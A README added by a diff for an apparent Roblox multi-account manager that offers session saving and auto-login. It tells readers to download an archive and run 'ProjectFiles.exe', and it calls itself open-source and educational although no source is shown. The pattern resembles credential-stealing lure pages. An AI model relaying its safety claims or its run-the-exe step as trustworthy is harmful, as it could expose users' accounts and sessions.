@@ -1,0 +1,74 @@
+🎯 Roblox Account Manager
+
+Multi Account Tool — 2026
+
+High-performance Roblox Account Manager focused on easy multi-account control and session management.
+Clean interface, fully configurable and simple to use.
+
+🎯 What it is
+
+Roblox Account Manager is a lightweight tool that allows you to manage multiple Roblox accounts, switch between them quickly and organize your profiles in one place.
+
+⚠️
+Use at your own risk. This is an open-source educational project.
+
+🚀 Quick Start
+
+1. Download the project using the button above.
+2. Extract the archive into a separate folder.
+3. Run ProjectFiles.exe.
+4. Follow the on-screen instructions.
+5. Add your accounts and start managing them.
+
+✨ Features
+
+| Feature                      | Description                                      |
+|------------------------------|--------------------------------------------------|
+| 👤 Multi Account Support | Add and manage unlimited accounts                |
+| 🔄 Quick Switch          | Instantly switch between accounts                |
+| 📂 Profile Organization  | Group and sort your accounts                     |
+| 🔐 Session Management    | Save and restore account sessions                |
+| 🖥️ Clean UI              | Simple and modern interface                      |
+| ⚡ Easy Setup            | Fast and straightforward installation            |
+
+🧩 How to use
+
+1. Launch the tool.
+2. Add your Roblox accounts.
+3. Organize them into profiles if needed.
+4. Switch accounts with one click.
+5. Launch Roblox with the selected account.
+
+⚙️ Configuration
+
+All settings can be changed in the config:
+
+- Account list
+- Profile groups
+- Auto-login options
+- Launch settings
+- Interface preferences
+
+❓ FAQ
+
+Is it safe?
+Use only with your own accounts. Educational purposes.
+
+Does it work with the latest Roblox?
+Yes, regularly updated.
+
+Is there a key system?
+No. Fully open and free.
+
+Can I manage many accounts?
+Yes — there is no limit.
+
+🤝 Contributing
+
+Pull requests, bug reports and improvements are welcome.
+
+📜 License
+
+MIT License — free to use, modify and redistribute.
+
+⭐ Star the repo if it helped you.
